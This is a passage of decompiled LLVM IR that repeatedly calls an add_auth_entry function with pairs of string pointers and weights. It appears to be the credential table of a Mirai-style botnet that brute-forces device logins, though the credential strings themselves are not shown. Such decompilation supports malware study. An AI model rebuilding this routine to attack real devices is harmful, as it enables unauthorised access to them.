  %v5_10218 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b69c.370 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b6a4.372 to i32), i32 %v0_10214)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b6a4.372 to i32), i32* %r1.global-to-local, align 4
  %v0_10224 = load i32, i32* @r4, align 4
  store i32 %v0_10224, i32* %r2.global-to-local, align 4
  %v5_10228 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b6a4.372 to i32), i32 %v0_10224)
  store i32 ptrtoint ([3 x i8]* @global_var_1b674.374 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b6ac.376 to i32), i32* %r1.global-to-local, align 4
  %v0_10234 = load i32, i32* @r4, align 4
  store i32 %v0_10234, i32* %r2.global-to-local, align 4
  %v5_10238 = call i32 @add_auth_entry(i32 ptrtoint ([3 x i8]* @global_var_1b674.374 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b6ac.376 to i32), i32 %v0_10234)
  store i32 ptrtoint ([7 x i8]* @global_var_1b6ac.376 to i32), i32* %r0.global-to-local, align 4
  %v0_10240 = load i32, i32* @r4, align 4
  store i32 %v0_10240, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b6ac.376 to i32), i32* %r1.global-to-local, align 4
  %v5_10248 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b6ac.376 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b6ac.376 to i32), i32 %v0_10240)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b6b4.378 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_10258 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b6b4.378 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b6b4.378 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_10268 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b6b4.378 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b6c0.380 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_10278 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b6c0.380 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b6c8.382 to i32), i32* %r1.global-to-local, align 4
  %v0_10284 = load i32, i32* @r4, align 4
  store i32 %v0_10284, i32* %r2.global-to-local, align 4
  %v5_10288 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b6c8.382 to i32), i32 %v0_10284)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b6d0.384 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_10298 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b6d0.384 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b6dc.386 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_102a8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b6dc.386 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b6e4.388 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_102b8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b6e4.388 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b6f0.390 to i32), i32* %r1.global-to-local, align 4
  %v0_102c4 = load i32, i32* @r4, align 4
  store i32 %v0_102c4, i32* %r2.global-to-local, align 4
  %v4_102c8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b6f0.390 to i32), i32 %v0_102c4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b6f8.392 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_102d8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b6f8.392 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b704.394 to i32), i32* %r1.global-to-local, align 4
  %v0_102e4 = load i32, i32* @r4, align 4
  store i32 %v0_102e4, i32* %r2.global-to-local, align 4
  %v4_102e8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b704.394 to i32), i32 %v0_102e4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b70c.396 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_102f8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b70c.396 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b714.398 to i32), i32* %r1.global-to-local, align 4
  %v0_10304 = load i32, i32* @r4, align 4
  store i32 %v0_10304, i32* %r2.global-to-local, align 4
  %v5_10308 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b714.398 to i32), i32 %v0_10304)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b71c.400 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_10318 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b71c.400 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b724.402 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_10328 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b724.402 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b730.404 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_10338 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b730.404 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b73c.406 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10348 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b73c.406 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b73c.406 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b73c.406 to i32), i32* %r1.global-to-local, align 4
  %v5_10358 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b73c.406 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b73c.406 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_1b744.408 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b744.408 to i32), i32* %r1.global-to-local, align 4
  %v5_10368 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b744.408 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b744.408 to i32), i32 7)
  store i32 ptrtoint (i32* @global_var_1b74c.410 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b468.240 to i32), i32* %r1.global-to-local, align 4
  %v0_10374 = load i32, i32* @r4, align 4
  store i32 %v0_10374, i32* %r2.global-to-local, align 4
  %v4_10378 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b74c.410 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b468.240 to i32), i32 %v0_10374)
  store i32 ptrtoint ([4 x i8]* @global_var_1b754.412 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b400.216 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_10388 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1b754.412 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b400.216 to i32), i32 8)
  store i32 ptrtoint ([7 x i8]* @global_var_1b758.414 to i32), i32* %r0.global-to-local, align 4
  %v0_10390 = load i32, i32* @r4, align 4
  store i32 %v0_10390, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b758.414 to i32), i32* %r1.global-to-local, align 4
  %v5_10398 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b758.414 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b758.414 to i32), i32 %v0_10390)
  store i32 ptrtoint ([6 x i8]* @global_var_1b760.416 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b768.418 to i32), i32* %r1.global-to-local, align 4
  %v0_103a4 = load i32, i32* @r4, align 4
  store i32 %v0_103a4, i32* %r2.global-to-local, align 4
  %v4_103a8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b760.416 to i32), i32 ptrtoint (i32* @global_var_1b768.418 to i32), i32 %v0_103a4)
  store i32 ptrtoint ([7 x i8]* @global_var_1b770.420 to i32), i32* %r0.global-to-local, align 4
  %v0_103b0 = load i32, i32* @r4, align 4
  store i32 %v0_103b0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b770.420 to i32), i32* %r1.global-to-local, align 4
  %v5_103b8 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b770.420 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b770.420 to i32), i32 %v0_103b0)
  store i32 ptrtoint ([6 x i8]* @global_var_1b778.422 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b778.422 to i32), i32* %r1.global-to-local, align 4
  %v5_103c8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b778.422 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b778.422 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_1b780.424 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b780.424 to i32), i32* %r1.global-to-local, align 4
  %v5_103d8 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b780.424 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b780.424 to i32), i32 7)
  store i32 ptrtoint ([4 x i8]* @global_var_1b788.426 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b788.426 to i32), i32* %r1.global-to-local, align 4
  %v5_103e8 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1b788.426 to i32), i32 ptrtoint ([4 x i8]* @global_var_1b788.426 to i32), i32 3)
  store i32 ptrtoint ([4 x i8]* @global_var_1b78c.428 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b78c.428 to i32), i32* %r1.global-to-local, align 4
  %v5_103f8 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1b78c.428 to i32), i32 ptrtoint ([4 x i8]* @global_var_1b78c.428 to i32), i32 3)
  store i32 ptrtoint (i32* @global_var_1b790.430 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b790.430 to i32), i32* %r1.global-to-local, align 4
  %v3_10408 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b790.430 to i32), i32 ptrtoint (i32* @global_var_1b790.430 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b798.432 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b798.432 to i32), i32* %r1.global-to-local, align 4
  %v5_10418 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b798.432 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b798.432 to i32), i32 4)
  store i32 ptrtoint ([7 x i8]* @global_var_1b7a0.434 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32* %r1.global-to-local, align 4
  %v0_10424 = load i32, i32* @r4, align 4
  store i32 %v0_10424, i32* %r2.global-to-local, align 4
  %v4_10428 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b7a0.434 to i32), i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32 %v0_10424)
  store i32 ptrtoint ([6 x i8]* @global_var_1b7a8.436 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b578.226 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10438 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b7a8.436 to i32), i32 ptrtoint (i32* @global_var_1b578.226 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b7a8.436 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3e8.208 to i32), i32* %r1.global-to-local, align 4
  %v0_10444 = load i32, i32* @r4, align 4
  store i32 %v0_10444, i32* %r2.global-to-local, align 4
  %v4_10448 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b7a8.436 to i32), i32 ptrtoint (i32* @global_var_1b3e8.208 to i32), i32 %v0_10444)
  store i32 ptrtoint ([7 x i8]* @global_var_1b7b0.438 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32* %r1.global-to-local, align 4
  %v0_10454 = load i32, i32* @r4, align 4
  store i32 %v0_10454, i32* %r2.global-to-local, align 4
  %v4_10458 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b7b0.438 to i32), i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32 %v0_10454)
  store i32 ptrtoint ([7 x i8]* @global_var_1b7b0.438 to i32), i32* %r0.global-to-local, align 4
  %v0_10460 = load i32, i32* @r4, align 4
  store i32 %v0_10460, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b7b0.438 to i32), i32* %r1.global-to-local, align 4
  %v5_10468 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b7b0.438 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b7b0.438 to i32), i32 %v0_10460)
  store i32 ptrtoint ([5 x i8]* @global_var_1b7b8.440 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b7b8.440 to i32), i32* %r1.global-to-local, align 4
  %v5_10478 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b7b8.440 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b7b8.440 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_1b7c0.442 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10488 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b7c0.442 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_1b7c8.444 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_10498 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b7c8.444 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 7)
  store i32 ptrtoint ([7 x i8]* @global_var_1b7d0.446 to i32), i32* %r0.global-to-local, align 4
  %v0_104a0 = load i32, i32* @r4, align 4
  store i32 %v0_104a0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b7d0.446 to i32), i32* %r1.global-to-local, align 4
  %v5_104a8 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b7d0.446 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b7d0.446 to i32), i32 %v0_104a0)
  store i32 ptrtoint ([6 x i8]* @global_var_1b7d8.448 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b7e0.450 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_104b8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b7d8.448 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b7e0.450 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b7e8.452 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b7f0.454 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_104c8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b7e8.452 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b7f0.454 to i32), i32 5)
  store i32 ptrtoint (i32* @global_var_1b7f8.456 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b7f8.456 to i32), i32* %r1.global-to-local, align 4
  %v3_104d8 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b7f8.456 to i32), i32 ptrtoint (i32* @global_var_1b7f8.456 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1b58c.458 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b800.460 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_104e8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b58c.458 to i32), i32 ptrtoint (i32* @global_var_1b800.460 to i32), i32 8)
  store i32 ptrtoint ([7 x i8]* @global_var_1b80c.462 to i32), i32* %r0.global-to-local, align 4
  %v0_104f0 = load i32, i32* @r4, align 4
  store i32 %v0_104f0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b80c.462 to i32), i32* %r1.global-to-local, align 4
  %v5_104f8 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b80c.462 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b80c.462 to i32), i32 %v0_104f0)
  store i32 ptrtoint (i32* @global_var_1b814.464 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b81c.466 to i32), i32* %r1.global-to-local, align 4
  %v0_10504 = load i32, i32* @r4, align 4
  store i32 %v0_10504, i32* %r2.global-to-local, align 4
  %v4_10508 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b814.464 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b81c.466 to i32), i32 %v0_10504)
  store i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b824.468 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_10518 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b824.468 to i32), i32 8)
  store i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b830.470 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_10528 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b830.470 to i32), i32 8)
  %v0_1052c = load i32, i32* @r4, align 4
  store i32 %v0_1052c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b83c.472 to i32), i32* %r1.global-to-local, align 4
  %v4_10538 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b83c.472 to i32), i32 %v0_1052c)
  store i32 ptrtoint (i32* @global_var_1b844.474 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b850.476 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v4_10548 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b844.474 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b850.476 to i32), i32 11)
  store i32 ptrtoint ([9 x i8]* @global_var_1b858.478 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b858.478 to i32), i32* %r1.global-to-local, align 4
  %v5_10558 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_1b858.478 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b858.478 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_1b864.480 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b864.480 to i32), i32* %r1.global-to-local, align 4
  %v5_10568 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_1b864.480 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b864.480 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_1b870.482 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b870.482 to i32), i32* %r1.global-to-local, align 4
  %v5_10578 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_1b870.482 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b870.482 to i32), i32 8)
  store i32 ptrtoint (i32* @global_var_1b574.298 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b574.298 to i32), i32* %r1.global-to-local, align 4
  %v3_10588 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b574.298 to i32), i32 ptrtoint (i32* @global_var_1b574.298 to i32), i32 8)
  store i32 ptrtoint (i32* @global_var_1b87c.484 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b87c.484 to i32), i32* %r1.global-to-local, align 4
  %v3_10598 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b87c.484 to i32), i32 ptrtoint (i32* @global_var_1b87c.484 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_1b888.486 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b888.486 to i32), i32* %r1.global-to-local, align 4
  %v5_105a8 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_1b888.486 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b888.486 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_1b894.488 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b894.488 to i32), i32* %r1.global-to-local, align 4
  %v5_105b8 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_1b894.488 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b894.488 to i32), i32 8)
  store i32 ptrtoint ([8 x i8]* @global_var_1b8a0.490 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1b478.244 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_105c8 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b8a0.490 to i32), i32 ptrtoint ([11 x i8]* @global_var_1b478.244 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b8a8.492 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_105d8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b8a8.492 to i32), i32 13)
  store i32 ptrtoint ([6 x i8]* @global_var_1b760.416 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b8b8.494 to i32), i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v4_105e8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b760.416 to i32), i32 ptrtoint (i32* @global_var_1b8b8.494 to i32), i32 14)
  store i32 ptrtoint ([10 x i8]* @global_var_1b8c8.496 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b8d4.498 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_105f8 = call i32 @add_auth_entry(i32 ptrtoint ([10 x i8]* @global_var_1b8c8.496 to i32), i32 ptrtoint (i32* @global_var_1b8d4.498 to i32), i32 10)
  store i32 ptrtoint ([10 x i8]* @global_var_1b8e0.500 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1b8ec.502 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_10608 = call i32 @add_auth_entry(i32 ptrtoint ([10 x i8]* @global_var_1b8e0.500 to i32), i32 ptrtoint ([11 x i8]* @global_var_1b8ec.502 to i32), i32 10)
  store i32 ptrtoint ([10 x i8]* @global_var_1b8f8.504 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b6b4.378 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_10618 = call i32 @add_auth_entry(i32 ptrtoint ([10 x i8]* @global_var_1b8f8.504 to i32), i32 ptrtoint (i32* @global_var_1b6b4.378 to i32), i32 10)
  store i32 ptrtoint ([10 x i8]* @global_var_1b904.506 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b6b4.378 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
